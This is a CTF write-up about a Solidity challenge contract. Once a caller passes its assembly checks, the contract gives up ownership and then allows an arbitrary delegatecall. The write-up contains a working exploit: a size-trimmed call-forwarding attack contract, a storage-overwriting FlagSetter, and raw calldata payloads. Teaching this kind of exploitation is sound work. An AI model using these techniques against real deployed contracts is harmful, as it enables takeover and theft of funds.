- [Smart Contract CTF Writeup](#smart-contract-ctf-writeup)
  - [1. Source Code Analysis](#1-source-code-analysis)
    - [1.1 Setup.sol](#11-setupsol)
    - [1.2 Yular.sol](#12-yularsol)
  - [2. Assembly Analysis](#2-assembly-analysis)
    - [2.1 Understanding EVM Assembly Basics](#21-understanding-evm-assembly-basics)
    - [2.2 Yular Assembly Breakdown](#22-yular-assembly-breakdown)
  - [3. Exploitation](#3-exploitation)
    - [3.1 FlagSetter Contract](#31-flagsetter-contract)
    - [3.2 Attack Contract](#32-attack-contract)
    - [3.3 Trimmed Attack Contract](#33-trimmed-attack-contract)
      - [3.3.1 Call Forwarding](#331-call-forwarding)
      - [3.3.2 Implementation of Trimmed Attack Contract](#332-implementation-of-trimmed-attack-contract)
      - [3.3.3 Calldata Construction \& Attack Execution](#333-calldata-construction--attack-execution)


# Smart Contract CTF Writeup

## 1. Source Code Analysis
This challenge provides two source code files including `Yular.sol` and `Setup.sol`. The objective is to set the `flag` variable in the Yular contract to `true`.

### 1.1 Setup.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import './Yular.sol';

contract Setup {
    Yular public yular ;
    
    constructor() {
        yular = new Yular();
    }

    function isSolved() public view returns (bool){
        return yular.isSolved();
    }
}
```
The Setup contract deploys a Yular contract and we can query the Yular address via the public `yular` variable. 

### 1.2 Yular.sol
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;


contract Yular {
    address public owner;
    bool public flag;

    modifier onlyOwner() {
        require(owner == msg.sender,"You are not owner");
        _;
    }
    constructor() {
        owner = msg.sender;
        flag = false;
    }

    function func() public {
        assembly {
            let size := extcodesize(caller())
            if gt(size, shl(0x6,2)) { invalid() }
            for { let i := 0 } lt(i, 0x4) { i := add(i, 1) } {
                mstore(0, blockhash(mod(caller(),4)))
                let success := call(gas(), caller(), 0, shl(0x5, 1), 0, 0,0)
                if eq(success, 0) { invalid() }
                returndatacopy(0, 0, shl(0x5, 1))
                switch eq(i, mload(0))
                case 0 { invalid() } 
            }
        }
        owner = msg.sender;
    }

    function targetCall (address target,bytes memory data) public onlyOwner(){
        (bool success,bytes memory returnData)=target.delegatecall(data);
    }
   

    function isSolved() public view returns (bool){
        return flag;
    }

}
```
The Yular contract contains:
- assembly code that checks certain conditions. If passed, the caller becomes the owner.
- `targetCall()`: only the owner can call this. It performs a `delegatecall` to an arbitrary address with arbitrary data.

## 2. Assembly Analysis

### 2.1 Understanding EVM Assembly Basics
There are three storage areas in the EVM:
1. Storage: permanent, on-chain state storage, where smart contracts store their persistent state that survives between different transactions and function calls
2. Memory: fast, temporary storage that exists only during the execution of a transcation
3. Stack: performs all computations and stores temporary values during instruction execution
```
┌─────────────────────────────────────────────────┐
│  Storage (Permanent)                            │
│  - State variables live here                    │
│  - Persists between transactions                │
│  - Expensive to read/write (high gas cost)      │
│  - Accessed via: sload(slot), sstore(slot, val) │
│  - Organized in 32-byte slots (0, 1, 2, ...)    │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│  Memory (Temporary)                             │
│  - Used during function execution               │
│  - Cleared after transaction                    │
│  - Cheaper than storage                         │
│  - Accessed via: mload(pos), mstore(pos, val)   │
│  - Byte-addressable (0, 32, 64, ...)            │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│  Stack (Most Temporary)                         │
│  - Local variables and computation results      │
│  - Cheapest                                     │
│  - Max depth: 1024 items                        │
│  - Used implicitly by assembly operations       │
└─────────────────────────────────────────────────┘
```

In order to understand EVM assembly better, some common assembly instructions are listed below.
| Instruction           | Description           | Example        |
| ---                   | ---                   | ---            |
| `caller()`            | Returns msg.sender    | `let sender := caller()` |
| `gas()`               | Returns remaining gas |
| `extcodesize(addr)`   | Returns code size of address |
| `sload(slot)`         | Read from storage     | `let val := sload(0)` |
| `sstore(slot, val)`   | Write to storage      | `mstore(0, 123)` |
| `return(pos, len)`    | Return data           | `return(0, 32)` |
| `invalid()`           | Abort execution       |
| `add(a, b)`           | Addition              |
| `mod(a, b)`           | Modulo                |
| `shl(bits, val)`      | Shift left            | `shl(6, 2)` = 128 |
| `lt(a, b)`            | Less than             | `lt(3, 5)` = 1 (true) |
| `gt(a, b)`            | Greater than          | `gt(5, 3)` = 1 (true) |
 
There are some fundamental instructions to inter-contract communication in Ethererum, but they work very differently.
1. `call()`: execute code in target's context. For example, when contract A calls contract B:
   - Execute B's code in B's context
   - Modify B's storage
   - `msg.sender()` is caller's address (A)
   - `this` is target's address (B)
2. `delegatecall()`: execute target's code but keep the caller's context. For example, when contract A delegatecalls contract B:
   - Execute B's code in A's context
   - modify A's storage
   - `msg.sender()` remains caller's address (A)
   - `this` remains caller's address (A)
3. `returndatacopy()`: used after an external call to retrieve the data that was returned. A sample code is shown below:
    ```solidity
    assembly {
    // Step 1: Call external contract
    let success := call(gas(), someContract, 0, 0, 0, 0, 0)
    
    // Step 2: Check how much data was returned
    let dataSize := returndatasize()  // e.g., 32 bytes
    
    // Step 3: Copy the return data to memory
    returndatacopy(0, 0, dataSize)    // Copy all return data to memory[0]
    
    // Step 4: Read the data from memory
    let returnedValue := mload(0)     // Read the copied data
    }
    ```
4. `return()`: used to end execution and send data back to the caller. A sample code is shown below:
    ```solidity
    function getValue() public pure returns (uint256) {
    assembly {
        mstore(0, 42)           // Store 42 at memory position 0
        
        // Return 32 bytes starting from memory position 0
        return(0, 32)           // Exits function, returns 42
        }
    }
    ```

### 2.2 Yular Assembly Breakdown
The assembly code in Yular Contract is shown as follows:
```solidity
function func() public {
    assembly {
        let size := extcodesize(caller())
        if gt(size, shl(0x6,2)) { invalid() }
        for { let i := 0 } lt(i, 0x4) { i := add(i, 1) } {
            mstore(0, blockhash(mod(caller(),4)))
            let success := call(gas(), caller(), 0, shl(0x5, 1), 0, 0,0)
            if eq(success, 0) { invalid() }
            returndatacopy(0, 0, shl(0x5, 1))
            switch eq(i, mload(0))
            case 0 { invalid() } 
        }
    }
    owner = msg.sender;
}
```
The assembly code performs the following:
1. Store the byte size of the caller's code. If the caller is an externallt owned account, size = 0; if the caller is a contract, size = contract's bytecode length.
2. Check if the caller's code size if greater than 128 bytes, if so, abort the transcation.
3. A for-loop with i = 0, 1, 2, 3:
   - `mod(caller(), 4)`: perform modulo operation on the msg.sender's address, which returns 0, 1, 2, or 3
   - `blockhash(number)`: returns the hash of a specific block number, and if number is not a valid recent block number returns 0. Since the previous step gives 0-3, this likely returns 0
   - `mstore(0, value)`: writes the 32 bytes data to memory position 0
   - `let success := call(gas(), caller(), 0, shl(0x5, 1), 0, 0, 0)`: call the caller. It call the caller's address with no data, sending all available gas, and no ETH.
        ```sol
        call(
        gas,           // Parameter 1: Gas to send
        address,       // Parameter 2: Address to call
        value,         // Parameter 3: ETH to send (in wei)
        argsOffset,    // Parameter 4: Memory position of input data
        argsSize,      // Parameter 5: Size of input data
        retOffset,     // Parameter 6: Memory position to store output
        retSize        // Parameter 7: Size of output to copy
        )
        ```
        Result: When a contract is called with no data, the EVM triggers the fallback caller's fallback function.
    - `if eq(success, 0) { invalid() }`: if the call to the caller failed, abort the entire transcation
    - `returndatacopy(0, 0, shl(0x5, 1))`: copies the first 32 bytes return data from the last call to memory position 0
    - `switch eq(i, mload(0))`: reads 32 bytes from memory position 0, which is the return value just copied. Check if loop variable i equals to the return value.
4. If all checks pass, the caller becomes the owner of the contract.


**Summary**:
To successfully call `func()` and become the owner, we must deploy a contract that:
1. has runtime bytecode <= 128 bytes
2. has a fallback function that must execute successfully when called with no data
3. returns incrementing values on successive calls and maintains state between calls
   - 1st call: return 0
   - 2nd call: return 1
   - 3rd call: return 2
   - 4th call: return 3


## 3. Exploitation

**Vulnerability Analysis**
1. By crafting attack contract, we can become the owner of Yular Contract via the `func()` function.
2. The `targetCall()` function performs a delegatecall to an arbitrary address with arbitrary data, which executes external code in the caller's storage context.
3. If storage layouts match, the external code can modify the caller's state variables. In this case, we can modify Yular's `flag` variable.

### 3.1 FlagSetter Contract
FlagSetter Contract is used to modify Yular contract's `flag` variable via delegatecall. The storage must match with Yular's layout. The code is shown below.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract FlagSetter {
    address public owner;  // slot 0 - must match Yular's layout
    bool public flag;      // slot 1 - must match Yular's layout
    
    function setFlag() external {
        flag = true;
    }
}
```

### 3.2 Attack Contract
Attack Contract is used to pass the assembly checks in `func()` to become the owner of Yular and call FlagSetter to modify the `flag` variable. It needs to:
- maintain a counter in storage
- return the counter value when called
- increment the counter after returning
- keey bytecode size <= 128 bytes

An initial code is shown below.
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract AttackContract {
    fallback() external {
        assembly {
            let count := sload(0)      // Read counter from slot 0
            mstore(0, count)           // Store it in memory position 0
            sstore(0, add(count, 1))   // Increment and save back to storage
            return(0, 32)              // Return 32 bytes from memory position 0
        }
    }
    
    // Function to call yular.func() and FlagSetter.setFlag()
    function attack(address yular, address flagSetter) external {
        yular.call(abi.encodeWithSignature("func()"));

        bytes memory setData = abi.encodeWithSignature("setFlag()");

        yular.call(abi.encodeWithSignature("targetCall(address,bytes)", flagSetter, setData));
    }
}
```

The Yular Contract's address can be queried via the public variable in Setup Contract.

First we deploy the FlagSetter Contract. We also need to deploy the Attack Contract and call `attack()` passing two parameters - Yular's address and FlagSetter's address.

However, the code above will exceed the limit of bytecode size in the Attack Contract.
```js
web3.eth.getCode("[ATTACK_ADDRESS]").then(c => console.log((c.length-2)/2))
```

### 3.3 Trimmed Attack Contract
The initial Attack Contract exceed the 128-byte limit, my solution is to remove the `attack()` function and handle everything through the fallback function with raw calldata manipulation. This way:
- No function selectors needed (fallback is called directly)
- No ABI encoding overhead
- Direct memory operations

#### 3.3.1 Call Forwarding
Since all EVM operations work with 256-bit (32-byte) words, we need paddings to send contract address (20 bytes), function selector (4 bytes), and parameter in the calldata.

The calldata structure is shown as follows:
```
0x00-0x1F: [12B padding] [20B contract address]
0x20-0x3F: [28B padding] [4B selector]
```

The call forwarding logic is shown as follows:
```sol
call(gas(), mload(0), 0, 0x3c, sub(size, 60), 0x0, 0x0)
     │       │            │    └─ Calldata size
     │       │            └────── Calldata starts at memory 0x3c (60 bytes)
     │       └─────────────────── Target address from memory[0]
     └─────────────────────────── Forward all gas
```
- `mload(0)`: reads bytes 0-31, which is the target address [0x00-0x1F]
- `0x3c`: the calldata to be sent starts at 0x3c (60B) = selector + parameters
- `sub(size, 60)`: skip the first 32 bytes (target address) and next 28 bytes (padding), remaining bytes = actual function call data

#### 3.3.2 Implementation of Trimmed Attack Contract
The complete trimmed Attack Contract is shown as follows, which is only 102 bytes, well under the 128-byte limit.
```sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

contract Attack {
    fallback() external payable {
        assembly {
            // Get the size of incoming calldata
            let size := calldatasize()
            
            // Copy all calldata to memory starting at position 0
            calldatacopy(0x0, 0, size)

            // Check if this is an empty call (from Yular's loop)
            switch size
            case 0 {
                // COUNTER LOGIC: When called with no data
                let ret := sload(0x0)              // Read counter from storage slot 0
                sstore(0x0, add(ret, 0x1))         // Increment counter
                mstore(0x0, ret)                   // Store old value in memory
                return(0x0, 0x20)                  // Return 32 bytes (the counter value)
            }
            // CALL FORWARDING: When called with data
            // Forward the call to the target contract
            let success := call(
                gas(),           // Forward all remaining gas
                mload(0),        // Target address (from memory[0-31])
                0,               // Send 0 ETH
                0x3c,            // Calldata starts at memory position 60 (0x3c)
                sub(size, 60),   // Calldata size = total size - 60
                0x0,             // Store return data at memory position 0
                0x0              // We don't care about return data size
            )
        }
    }
}
```

The fallback function operates based on calldata size:
1. Counter (size = 0)
   - triggered when Yular's `func()` calls Attack with empty calldata
   - returns incrementing values: 0, 1, 2, 3
   - this is the same logic as the untrimmed version
2. Call Forwarding (size > 0)
   - triggered when we send crafted calldata
   - replaces the original `attack()` function
   - forwards calls to Yular contract

By encoding the target address and function call into the calldata itself, we eliminate the need for a separate function. The fallback function becomes a generic call forwarder that:
- reads the target from the calldata
- extracts the function call from the calldata
- forwards it using low-level `call`

#### 3.3.3 Calldata Construction & Attack Execution
We need to manually construct raw calldata to interact with the Attack Contract.

**Step 0: Deploy Contracts**
- Setup Contract
- Yular Contract: `0x704BbDdb620d93013746197a24f53C8c7B41Be40`
- FlagSetter Contract: `0xb19E2bD8E0853a4b3745FBAc28526E7dd0935395`
- Attack Contract

**Step 1: Call Yular.func() to Become Owner**
The calldata construction is shown as follows:
```
0x00-0x1F: [12B padding] [20B Yular address]
0x20-0x3F: [28B padding] [4B func() selector]
```

The Yular address can be obtained via the Setup Contract, and the `func()` selector can be obtained by the following command:
```js
web3.utils.keccak256("func()")
// Output: 0xbfa814b5f223311c5be446e7e7adb4ccb8dc1ea8f34511e8fb1f4900359a5003
// Take first 4 bytes: 0xbfa814b5
```

Therefore, the first calldata payload is shown as follows:
```
000000000000000000000000704BbDdb620d93013746197a24f53C8c7B41Be40
00000000000000000000000000000000000000000000000000000000bfa814b5
```

After sending the first payload via Attack Contract's low-level call, the Attack Contract becomes the owner of Yular Contract:
- Attack's fallback receives 64 bytes (size ≠ 0, enters call forwarding)
- Call Yular, send calldata from memory position `0x3c` and 4 bytes `func()` selector
- `Yular.func()` executes:
  - check Attack Contract size: 102 bytes < 128 bytes
  - Loop 4 times, calling Attack with empty calldata
  - Attack returns 0,1,2,3
- Result: `owner = msg.sender`, Attack becomes owner

**Step 2: Call targetCall() to Set Flag**
The `targetCall` function signature is:
```sol
function targetCall(address target, bytes memory data) public onlyOwner()
```
The second payload uses delegatecall to execute FlagSetter's `setFlag()` in Yular's context, i.e., `Yular.targetCall(FlagSetter, setFlag())`.

According to Solidity ABI encoding, the calldata construction is shown as follows:
```
0x00-0x1F: [12B padding] [20B Yular address]
0x20-0x3F: [28B padding] [4B targetCall() selector]
0x40-0x5F: [12B padding] [20B FlagSetter address]
0x60-0x7F: [Offset pointer for data parameter]
0x80-0x9F: [Length of data]
0xA0-0xBF: [Actual data content]
```
The `targetCall()` and `setFlag()` selector can be obtained through the following commands:
```js
web3.utils.keccak256("targetCall(address,bytes)")
// Output: 0x38461de92735a9026e09de26f6a72e784965993ede6292cbb87c1a84bdb0d63b
// Take first 4 bytes: 0x38461de9

web3.utils.keccak256("setFlag()")
// Output: 0x62548c7b2b339d0e30a21e615f20d65a6e40365d398c1d5c8e7cd5a4fbd146b4
// Take first 4 bytes: 0x62548c7b
```

The offset pointer is calucated based on ABI encoding rules: 
- Indicate where the dynamic data (bytes) begins, relative to the start of the parameters section
- In Yular's perpective, parameters start at position `0x04` (after the 4-byte selector)
- Fixed parameters: `address target` (32 bytes) + `offset pointer` (32 bytes) = 64 bytes = `0x40`
- Dynamic data starts at: `0x04 + 0x40 = 0x44` (in Yular's calldata)
- Therefore, the offset pointer = `0x40`

The memory layout from two perspectives is shown below:
| Attack's Calldata | Yular's Calldata  | Content |
| ---               | ---               | ---     |
| 0x00-0x1F         | [Not sent]        | Yular address |
| 0x20-0x3B         | [Not sent]        | Padding       |
| 0x3C-0x3F         | 0x00-0x03         | targetCall selector |
| 0x40-0x5F         | 0x04-0x23         | FlagSetter address (param 1) |
| 0x60-0x7F         | 0x24-0x43         | Offset = 0x40 (param 2) |
| 0x80-             | 0x44-             | Dynamic data |

The length of data specifies how many bytes the dynamic data contains. In the case, the actual data content is the `setFlag()` function selector, therefore, the length of data is 4 bytes (`0x04`).

To note, we need different alignments for paddings:
| Data                   | Type | alignment |
| ---                    | ---       | ---       |
| Yular/FlagSetter       | address   | right     |
| targetCall()/SetFlag() | function selector | right |
| Offset/Data Length     | uint256   | right     |
| Data content           | byte      | left      |

Therefore, the second calldata payload is shown as follows:
```
000000000000000000000000704BbDdb620d93013746197a24f53C8c7B41Be40
0000000000000000000000000000000000000000000000000000000038461de9
000000000000000000000000b19E2bD8E0853a4b3745FBAc28526E7dd0935395
0000000000000000000000000000000000000000000000000000000000000040
0000000000000000000000000000000000000000000000000000000000000004
62548c7b00000000000000000000000000000000000000000000000000000000
```

After sending the second payload, the `flag` in Yular is set to be `true`:
- Attack's fallback receives 192 bytes (size ≠ 0, enters call forwarding)
- Attack calls Yular with `targetCall()` and encoded parameters
- `Yular.targetCall()` executes:
  - check `onlyOwner` modifier: `msg.sender` is Attack Contract
  - decode parameters: target = FlagSetter address, data = `setFlag()` selector
  - perform delegatecall: `FlagSetter.delegatecall(setFlag())`
- `setFlag()` executes in Yular's context
  - modify storage slot 1 (flag variable)
  - set `flag = true`
